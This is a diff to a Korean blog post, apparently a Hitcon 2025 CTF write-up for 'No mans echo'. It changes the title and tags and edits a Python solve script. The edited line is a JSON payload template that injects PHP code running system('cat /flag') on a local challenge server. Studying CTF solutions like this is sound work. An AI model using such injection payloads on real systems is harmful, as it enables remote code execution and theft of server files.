@@ -1,7 +1,7 @@
 ---
 layout: post
-title: "Hitcon Writeup No mans echo"
-tags: [정보보안]
+title: "Hitcon 2025 Writeup (No mans echo)"
+tags: [정보보안, CTF]
 comments: true
 ---
 
@@ -185,7 +185,7 @@ from concurrent.futures import ThreadPoolExecutor
 TARGET_URL = "http://localhost:8080/index.php"
 MAG = "__HIT__"  # PHP 코드가 echo하는 히트 마커
 # JSON 페이로드: signal="Arrival"일 때 logogram 명령어 실행, 플래그 파일 cat 명령 포함
-payload_template = '{{"signal":"Arrival","logogram":"echo \\"{}\\n\\"; system(\'cat /flag\');"}}'
+payload_template = '{"signal":"Arrival","logogram":"echo \\"{}\\n\\"; system(\'cat /flag\');"}'
 
 EPHEMERAL_MIN = 32768
 EPHEMERAL_MAX = 60999  # PHP 코드가 43개 포트 범위로 요청하므로 넉넉하게 잡음
